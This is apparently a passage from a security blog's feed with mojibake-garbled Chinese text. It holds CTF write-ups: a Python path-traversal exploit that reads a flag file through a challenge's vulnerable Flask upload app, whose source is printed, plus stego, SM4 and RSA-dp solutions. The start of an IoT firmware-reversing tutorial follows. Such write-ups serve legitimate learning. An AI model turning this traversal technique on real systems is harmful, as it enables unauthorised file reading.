class="line">    <span class="keyword">if</span> len(filename) != <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    r = requests.post(target+<span class="string">"upload.php"</span>,</span><br><span class="line">                      files=&#123;<span class="string">'file'</span>: (filename + <span class="string">'.jpg'</span>,</span><br><span class="line">                                      <span class="string">'z3r0test'</span>, <span class="string">'text/plain'</span>)&#125;</span><br><span class="line">                      )</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">    pic_url = soup.find(<span class="string">'img'</span>)</span><br><span class="line">    <span class="comment"># print(pic_url['src'].replace('img.php?name=', ''))</span></span><br><span class="line">    filename = pic_url[<span class="string">'src'</span>].replace(<span class="string">'img.php?name='</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="comment"># print(filename)</span></span><br><span class="line">    urldecode = urllib.parse.unquote(filename)</span><br><span class="line">    <span class="keyword">return</span> urldecode[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(target, filename)</span>:</span></span><br><span class="line">    filename = urllib.parse.unquote(filename)</span><br><span class="line">    r = requests.get(target+<span class="string">"img.php"</span>,</span><br><span class="line">                     params=&#123;<span class="string">'name'</span>: filename&#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    target = <span class="string">"http://fc663c386ea14c96ba9808b72602d341fda4447a2bfb4e01.changame.ichunqiu.com/"</span></span><br><span class="line">    payload = <span class="string">"../.././proc/self/root/root/flag.txt"</span></span><br><span class="line">    <span class="comment"># payload = "../..//proc/self/cwd/app.py"</span></span><br><span class="line">    <span class="keyword">if</span> len(payload) % <span class="number">3</span> != <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"must be three times!"</span>)</span><br><span class="line">        exit()</span><br><span class="line">    final = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(payload), <span class="number">3</span>):</span><br><span class="line">        final += base_encode(target, payload[i:i + <span class="number">3</span>])</span><br><span class="line">    final = urllib.parse.quote(final)</span><br><span class="line">    read(target, final)</span><br></pre></td></tr></table></figure></p><p>æ‰€ä»¥å¯ä»¥å¾—åˆ°flagå¦‚ä¸‹<br><img src="https://i.loli.net/2019/08/16/IRlo2pfbsH8kGix.png" alt="F8BBDDFF7-AA616575E3.png"></p><p>è¿˜å¯ä»¥è¯»åˆ°å¯¹åº”çš„ç½‘ç«™æºç <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> r_encode, r_decode, read_file</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, request</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">'/tmp/uploads/'</span></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>&#125;</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="meta">@app.route('/index.php')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    file = session.get(<span class="string">'file'</span>)</span><br><span class="line">    <span class="keyword">if</span> file:</span><br><span class="line">        file = bytes.decode(file)</span><br><span class="line">        file = parse.quote(file)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, file=file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload.php', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(app.config[<span class="string">'UPLOAD_FOLDER'</span>]):</span><br><span class="line">                os.makedirs(app.config[<span class="string">'UPLOAD_FOLDER'</span>])</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"ä¸å…è®¸çš„æ ¼å¼"</span></span><br><span class="line">    session[<span class="string">'file'</span>] = r_encode(b64encode(str.encode(file.filename)))</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/img.php', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img</span><span class="params">()</span>:</span></span><br><span class="line">    file = request.args.get(<span class="string">"name"</span>)</span><br><span class="line">    file = r_decode(str.encode(file))</span><br><span class="line">    file = b64decode(file)</span><br><span class="line">    file = UPLOAD_FOLDER + bytes.decode(file)</span><br><span class="line">    image = read_file(file)</span><br><span class="line">    <span class="keyword">return</span> Response(image, mimetype=<span class="string">"image/jpeg"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host = <span class="string">'0.0.0.0'</span>,</span><br><span class="line">        port = <span class="number">80</span>,</span><br><span class="line">     )</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œæœ‰ä¸¤ä¸ªtrick</p><ol><li>fuzzå‡ºæ–‡ä»¶åçš„ç¼–ç å…³ç³»ï¼Œè¿™ä¸ªåœ¨æŒ–æ´ä¸­ä¹Ÿä¼šæœ‰åœºæ™¯ï¼Œå…·ä½“çš„å»wooyunçœ‹</li><li><code>/proc/self/cwd/</code> æŒ‡å‘çš„æ˜¯å½“å‰è·¯å¾„ï¼Œåœ¨æœ¬é¢˜ä¸­ç”¨äºæ‹¼å‡‘3å€æ•°é•¿åº¦çš„å­—ç¬¦ä¸²</li></ol><h2 id="0x04-ç­¾åˆ°é¢˜"><a href="#0x04-ç­¾åˆ°é¢˜" class="headerlink" title="0x04 ç­¾åˆ°é¢˜"></a>0x04 ç­¾åˆ°é¢˜</h2><h4 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>Iâ€™m gamectf.com, I love TXT.</p><h4 id="é¢˜ç›®è§£ç­”-3"><a href="#é¢˜ç›®è§£ç­”-3" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>è”æƒ³åˆ°TXTå­—æ®µï¼Œæ‰€ä»¥ç›´æ¥æŸ¥åˆ°flag</p><p><img src="https://i.loli.net/2019/08/16/vnHfeML3Y7CAWby.png" alt="5A6A112C-D1A1-4244-B5B0-EE9AAF435A01.png"></p><h2 id="0x05-24word"><a href="#0x05-24word" class="headerlink" title="0x05 24word"></a>0x05 24word</h2><h4 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>try to do.</p><h4 id="é¢˜ç›®è§£ç­”-4"><a href="#é¢˜ç›®è§£ç­”-4" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>æ‰“å¼€æ˜¯ä¸€å¼ è¿™æ ·çš„å›¾ç‰‡</p><p><img src="https://i.loli.net/2019/08/16/MDjyHYscquJPXnR.png" alt="24w.png"></p><p>binwalk -e æå–å‡ºå…¶ä¸­çš„å‹ç¼©åŒ…</p><p>çœ‹å›¾è”æƒ³åˆ°ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚åŠ å¯†è§£å¯†</p><p><a href="https://z.duoluosb.com/" target="_blank" rel="noopener">https://z.duoluosb.com/</a></p><p>è‡ªç”± å’Œè° å…¬æ­£ è¯šä¿¡ å¹³ç­‰ å…¬æ­£ è‡ªç”± å…¬æ­£ å¹³ç­‰ å¹³ç­‰ å…¬æ­£<br>CodeV<br>å…¬æ­£ æ°‘ä¸» å…¬æ­£ è¯šä¿¡ æ–‡æ˜ æ³•æ²» å¹³ç­‰ å…¬æ­£ å¹³ç­‰ æ³•æ²» å’Œè°<br>alues</p><p>æ‰€ä»¥å¾—åˆ°è§£å‹å¯†ç : CodeValues</p><p>è§£å‹å®Œåˆä¸€å¼ å›¾ï¼Œä¸Šé¢å¸¦äº†Data Matrixï¼Œå¾®ä¿¡æ‰«ä¸€ä¸‹å¾—åˆ°flag</p><p><img src="https://i.loli.net/2019/08/16/uBVDzZcHSr4JPsd.jpg" alt="24c 2.jpg"></p><h2 id="0x06-ä¸ƒä»£ç›®"><a href="#0x06-ä¸ƒä»£ç›®" class="headerlink" title="0x06 ä¸ƒä»£ç›®"></a>0x06 ä¸ƒä»£ç›®</h2><h4 id="é¢˜ç›®æè¿°-5"><a href="#é¢˜ç›®æè¿°-5" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>try to do.</p><h4 id="é¢˜ç›®è§£ç­”-5"><a href="#é¢˜ç›®è§£ç­”-5" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>æ‰“å¼€gifæ˜¾ç¤ºæ–‡ä»¶æŸåï¼Œä½¿ç”¨hexç¼–è¾‘å™¨ä¿®æ”¹gitå¤´å¾—åˆ°æ­£å¸¸çš„æ–‡ä»¶</p><p>ç„¶ååœ¨ä¸‹é¢çš„ç½‘ç«™å°†å›¾é€å¸§åˆ†è§£</p><p><a href="https://zh.bloggif.com/gif-extract?id=1e36fc0da9d495cfba235a6590b61ed7" target="_blank" rel="noopener">https://zh.bloggif.com/gif-extract?id=1e36fc0da9d495cfba235a6590b61ed7</a></p><p>æœ€ç»ˆåœ¨ç¬¬ä¸ƒå¸§ä½¿ç”¨stegoåˆ†æå¾—åˆ°flag</p><p><img src="https://i.loli.net/2019/08/16/IBnLsO7uE4GcyNm.png" alt="7BE386FC-9FB2-4057-A121-E3360223E716.png"></p><h2 id="0x07-äºšè¨è¥¿"><a href="#0x07-äºšè¨è¥¿" class="headerlink" title="0x07 äºšè¨è¥¿"></a>0x07 äºšè¨è¥¿</h2><h4 id="é¢˜ç›®æè¿°-6"><a href="#é¢˜ç›®æè¿°-6" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>try to do.</p><h4 id="é¢˜ç›®è§£ç­”-6"><a href="#é¢˜ç›®è§£ç­”-6" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>stringså‘½ä»¤ç›´æ¥çš„å¾—åˆ°pass<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings yasaxi_45d7d3f89b50ad351e8bc385b591fd80.zip</span><br></pre></td></tr></table></figure></p><p>è§£å‹æ–‡ä»¶å¤¹åæ˜¯ä¸€ä¸ªå›¾ç‰‡<br>å›¾ç‰‡é‡Œé¢æœ‰ookç¼–ç <br>ç›´æ¥è§£ç å¾—åˆ°flag</p><p><img src="https://i.loli.net/2019/08/16/sB5wKuyEYPvilHf.png" alt="57498389-1BD5-40DF-AA1E-D15BCAE51C0B.png"></p><h2 id="0x08-sm4"><a href="#0x08-sm4" class="headerlink" title="0x08 sm4"></a>0x08 sm4</h2><h4 id="é¢˜ç›®æè¿°-7"><a href="#é¢˜ç›®æè¿°-7" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>try to do.</p><h4 id="é¢˜ç›®è§£ç­”-7"><a href="#é¢˜ç›®è§£ç­”-7" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p><a href="https://github.com/yang3yen/pysm4" target="_blank" rel="noopener">https://github.com/yang3yen/pysm4</a></p><p>å›½å¯†SM4(æ— çº¿å±€åŸŸç½‘SMS4)ç®—æ³•ï¼Œ ä¸€ä¸ªåˆ†ç»„ç®—æ³•ï¼Œ åˆ†ç»„é•¿åº¦ä¸º128bitï¼Œ å¯†é’¥é•¿åº¦ä¸º128bit æ‰€ä»¥éœ€è¦åˆ†æ®µè§£ï¼Œæ³¨æ„è¡¥ä½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line">key = [<span class="number">13</span>, <span class="number">204</span>, <span class="number">99</span>, <span class="number">177</span>, <span class="number">254</span>, <span class="number">41</span>, <span class="number">198</span>, <span class="number">163</span>, <span class="number">201</span>, <span class="number">226</span>, <span class="number">56</span>, <span class="number">214</span>, <span class="number">192</span>, <span class="number">194</span>, <span class="number">98</span>, <span class="number">104</span>]</span><br><span class="line">c = [<span class="number">46</span>, <span class="number">48</span>, <span class="number">220</span>, <span class="number">156</span>, <span class="number">184</span>, <span class="number">218</span>, <span class="number">57</span>, <span class="number">13</span>, <span class="number">246</span>, <span class="number">91</span>, <span class="number">1</span>, <span class="number">63</span>, <span class="number">60</span>, <span class="number">67</span>, <span class="number">105</span>, <span class="number">64</span>, <span class="number">149</span>, <span class="number">240</span>, <span class="number">217</span>, <span class="number">77</span>, <span class="number">107</span>, <span class="number">49</span>, <span class="number">222</span>, <span class="number">61</span>, <span class="number">155</span>, <span class="number">225</span>, <span class="number">231</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">121</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">60</span>, <span class="number">182</span>, <span class="number">65</span>, <span class="number">101</span>, <span class="number">39</span>, <span class="number">253</span>, <span class="number">250</span>, <span class="number">224</span>, <span class="number">9</span>, <span class="number">204</span>, <span class="number">154</span>, <span class="number">122</span>, <span class="number">206</span>, <span class="number">43</span>, <span class="number">97</span>, <span class="number">59</span>]</span><br><span class="line">tmp =<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">    <span class="keyword">if</span> len(str(hex(key[i])))&lt;<span class="number">4</span>:</span><br><span class="line">        tmp = tmp + <span class="string">'0'</span>+str(hex(key[i])[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp =tmp  + str(hex(key[i])[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line">tmp =<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">    <span class="keyword">if</span> len(str(hex(c[i])))&lt;<span class="number">4</span>:</span><br><span class="line">        tmp = tmp + <span class="string">'0'</span>+str(hex(c[i])[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp =tmp  + str(hex(c[i])[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line">key =  <span class="number">0x0dcc63b1fe29c6a3c9e238d6c0c26268</span></span><br><span class="line">c1 =   <span class="number">0x2e30dc9cb8da390df65b013f3c436940</span></span><br><span class="line">c2 =   <span class="number">0x95f0d94d6b31de3d9be1e7c4a7790910</span></span><br><span class="line">c3 =   <span class="number">0x3cb6416527fdfae009cc9a7ace2b613b</span></span><br><span class="line"><span class="comment">#2e30dc9cb8da390df65b013f3c436940</span></span><br><span class="line"><span class="comment">#95f0d94d6b31de3d9be1e7c4a7790910</span></span><br><span class="line"><span class="comment">#3cb6416527fdfae009cc9a7ace2b613b</span></span><br><span class="line">clear_num1 = decrypt(c1, key)</span><br><span class="line">clear_num2 = decrypt(c2, key)</span><br><span class="line">clear_num3= decrypt(c3, key)</span><br><span class="line"><span class="keyword">print</span> str(hex(clear_num1))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> str(hex(clear_num2))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> str(hex(clear_num3))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h2 id="0x09-db"><a href="#0x09-db" class="headerlink" title="0x09 db"></a>0x09 db</h2><h4 id="é¢˜ç›®æè¿°-8"><a href="#é¢˜ç›®æè¿°-8" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>try to do.</p><h4 id="é¢˜ç›®è§£ç­”-8"><a href="#é¢˜ç›®è§£ç­”-8" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>å·²çŸ¥N dq æ±‚åˆ†è§£é—®é¢˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">9637571466652899741848142654451413405801976834328667418509217149503238513830870985353918314633160277580591819016181785300521866901536670666234046521697590230079161867282389124998093526637796571100147052430445089605759722456767679930869250538932528092292071024877213105462554819256136145385237821098127348787416199401770954567019811050508888349297579329222552491826770225583983899834347983888473219771888063393354348613119521862989609112706536794212028369088219375364362615622092005578099889045473175051574207130932430162265994221914833343534531743589037146933738549770365029230545884239551015472122598634133661853901</span></span><br><span class="line">dp=<span class="number">81339405704902517676022188908547543689627829453799865550091494842725439570571310071337729038516525539158092247771184675844795891671744082925462138427070614848951224652874430072917346702280925974595608822751382808802457160317381440319175601623719969138918927272712366710634393379149593082774688540571485214097</span></span><br><span class="line">c=<span class="number">5971372776574706905158546698157178098706187597204981662036310534369575915776950962893790809274833462545672702278129839887482283641996814437707885716134279091994238891294614019371247451378504745748882207694219990495603397913371579808848136183106703158532870472345648247817132700604598385677497138485776569096958910782582696229046024695529762572289705021673895852985396416704278321332667281973074372362761992335826576550161390158761314769544548809326036026461123102509831887999493584436939086255411387879202594399181211724444617225689922628790388129032022982596393215038044861544602046137258904612792518629229736324827</span></span><br><span class="line">r = <span class="number">3</span></span><br><span class="line">p = pow(r,e*dp,n)-r%n</span><br><span class="line">p = gmpy2.gcd(n,p)</span><br><span class="line"><span class="keyword">print</span> p</span><br><span class="line"><span class="keyword">print</span> n/p</span><br><span class="line">q= <span class="number">97967760714365562093916104858384893828746431642467029585975238084315810021090864458586154529967237614974563846071700091242756496083221705212495652837671370581444579945909265868365865106738889897018594915115133212043327703567935896287234339778667527842604275909693199845318489073853263155905386941710423649313</span></span><br><span class="line">fn = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d= gmpy2.invert(e,fn)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'d='</span>,d</span><br><span class="line">plain= pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'plain='</span>, plain</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'plain='</span>, hex(plain)</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'plain='</span>, hex(plain)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;æƒ¨æƒ¨æƒ¨ï¼Œé€Ÿæˆäº†ä¸€ä¸‹miscï¼Œæœ€åè¿˜æ˜¯21ï¼Œé‚£ä¸ªwebæ³¨å…¥ä¹Ÿæ²¡è§£å‡ºæ¥&lt;/p&gt;
&lt;h2 id=&quot;0x01
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>IoTå›ºä»¶é€†å‘å…¥é—¨</title>
    <link href="http://zer0yu.github.io/2019/08/15/How_to_start_IoT_Reverse/"/>
    <id>http://zer0yu.github.io/2019/08/15/How_to_start_IoT_Reverse/</id>
    <published>2019-08-15T15:28:48.000Z</published>
    <updated>2019-08-15T15:52:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä¸€ç¯‡å…¥é—¨çº§åˆ«çš„IoTå›ºä»¶é€†å‘æ–‡ç« </p><h2 id="0x01-å›ºä»¶ä¸‹è½½"><a href="#0x01-å›ºä»¶ä¸‹è½½" class="headerlink" title="0x01 å›ºä»¶ä¸‹è½½"></a>0x01 å›ºä»¶ä¸‹è½½</h2><ol><li>tp-link å›ºä»¶ä¸‹è½½</li></ol><p><a href="https://www.tp-link.com/in/support/download/" target="_blank" rel="noopener">https://www.tp-link.com/in/support/download/</a></p><p>æ­¤å¤–tp-linkè¿˜æä¾›äº†åœ¨çº¿çš„ä»¿çœŸç¯å¢ƒ</p><ol start="2"><li>å°ç±³æ™ºèƒ½å®¶å±…çš„ç¯å¢ƒ</li></ol><p><a href="https://github.com/dgiese/dustcloud" target="_blank" rel="noopener">https://github.com/dgiese/dustcloud</a></p><h2 id="0x02-å¸¸ç”¨å·¥å…·"><a href="#0x02-å¸¸ç”¨å·¥å…·" class="headerlink" title="0x02 å¸¸ç”¨å·¥å…·"></a>0x02 å¸¸ç”¨å·¥å…·</h2><h3 id="Linuxç³»ç»Ÿè‡ªå¸¦å·¥å…·"><a href="#Linuxç³»ç»Ÿè‡ªå¸¦å·¥å…·" class="headerlink" title="Linuxç³»ç»Ÿè‡ªå¸¦å·¥å…·"></a>Linuxç³»ç»Ÿè‡ªå¸¦å·¥å…·</h3><p>file â€” ç”¨æ¥æ£€æµ‹æ˜¯å¦æ˜¯æœ‰æ•ˆçš„æ–‡ä»¶å’Œæ–‡ä»¶ç±»å‹<br>xxd - ä¼šç”Ÿæˆç»™å®šæ–‡ä»¶æˆ–è€…æ ‡å‡†è¾“å…¥çš„åå…­è¿›åˆ¶æ ¼å¼ï¼Œä¹Ÿå¯ä»¥å°†åå…­è¿›åˆ¶æ ¼å¼è½¬æ¢å›åŸå§‹çš„äºŒè¿›åˆ¶æ ¼å¼<br>hexdump â€”16è¿›åˆ¶å¯¼å‡ºå·¥å…·<br>strings è·Ÿhexdumpç±»ä¼¼ä½†æ˜¯å¯ä»¥ä»¥å¯è¯»çš„å½¢å¼å±•ç¤º<br>dd â€” ä»äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŒ–æ˜æ•°æ®<br>lzma â€” è§£å‹LZMAæ–‡ä»¶</p><h3 id="ç¬¬ä¸‰æ–¹å·¥å…·"><a href="#ç¬¬ä¸‰æ–¹å·¥å…·" class="headerlink" title="ç¬¬ä¸‰æ–¹å·¥å…·"></a>ç¬¬ä¸‰æ–¹å·¥å…·</h3><p><a href="https://github.com/radare/radare2" target="_blank" rel="noopener">Radare2</a> - é€†å‘å·¥ç¨‹å’ŒäºŒè¿›åˆ¶åˆ†æçš„å®Œæ•´æ¡†æ¶<br><a href="https://ghidra-sre.org/" target="_blank" rel="noopener">ghidra</a> - nsaå¼€æºçš„é€†å‘åˆ†æå·¥å…·<br>IDA Pro - ä¸ç”¨å¤šè§£é‡Šçš„è¶…å¼ºé€†å‘åˆ†æå·¥å…·<br><a href="https://github.com/ChrisTheCoolHut/Firmware_Slap" target="_blank" rel="noopener">Firmware_Slap</a> - ä½¿ç”¨çº¦æŸæ±‚è§£å’Œå‡½æ•°èšç±»è‡ªåŠ¨å‘ç°å›ºä»¶ä¸­çš„æ¼æ´<br><a href="https://github.com/craigz28/firmwalker" target="_blank" rel="noopener">firmwalker</a> - åœ¨å®‰è£…çš„å›ºä»¶æ–‡ä»¶ç³»ç»Ÿä¸­æœç´¢æ•æ„Ÿçš„æ–‡ä»¶<br>binwalk - é€šè¿‡å›ºä»¶æ–‡ä»¶å¤´æ¥åˆ†ææ–‡ä»¶å’Œæ–‡ä»¶ç³»ç»Ÿ<br><a href="https://code.google.com/archive/p/firmware-mod-kit" target="_blank" rel="noopener">Fireware Mod Kit</a> â€” è‡ªåŠ¨åŒ–åˆ†æå›ºä»¶æ–‡ä»¶çš„ä¸€ç³»åˆ—è„šæœ¬<br><a href="http://www.tldp.org/HOWTO/SquashFS-HOWTO/mksqoverview.html" target="_blank" rel="noopener">squashfs-tools</a>â€” å¯ä»¥é€šè¿‡apt-get squashfs-tools æ¥å®‰è£…ã€‚ç”¨æ¥å¤„ç†squashfsçš„ä¸€ç³»åˆ—å·¥å…·</p><h2 id="0x03-åˆ†æç¤ºä¾‹"><a href="#0x03-åˆ†æç¤ºä¾‹" class="headerlink" title="0x03 åˆ†æç¤ºä¾‹"></a>0x03 åˆ†æç¤ºä¾‹</h2><p>æ­¤å¤„ä¸‹è½½å›ºä»¶ <a href="https://static.tp-link.com/2018/201804/20180403/TL-WR841N%28EU%29_V14_180319.zip" target="_blank" rel="noopener">TL-WR841N(EU)_V14_180319</a></p><p>ä¸‹è½½ä¹‹åè§£å‹æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip TL-WR841N\(EU\)_V14_180319.zip</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/15/8c7qXriJG5KaIpT.png" 